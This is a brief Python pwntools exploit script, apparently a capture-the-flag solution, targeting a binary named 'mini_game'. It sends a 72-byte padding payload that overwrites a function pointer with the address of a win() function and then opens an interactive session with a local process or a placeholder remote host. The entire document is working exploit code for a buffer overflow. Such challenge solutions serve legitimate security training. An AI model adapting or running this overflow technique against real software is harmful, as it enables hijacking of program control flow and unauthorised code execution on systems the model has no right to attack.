#!/usr/bin/env python3
from pwn import *

exe = ELF("./mini_game")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_FUNCPTR = 72

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_FUNCPTR,   # fill buffer up to func_ptr
        p64(exe.sym.win),            # overwrite func_ptr with address of win()
    )

    r.recvuntil(b"go?\n")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':
    main()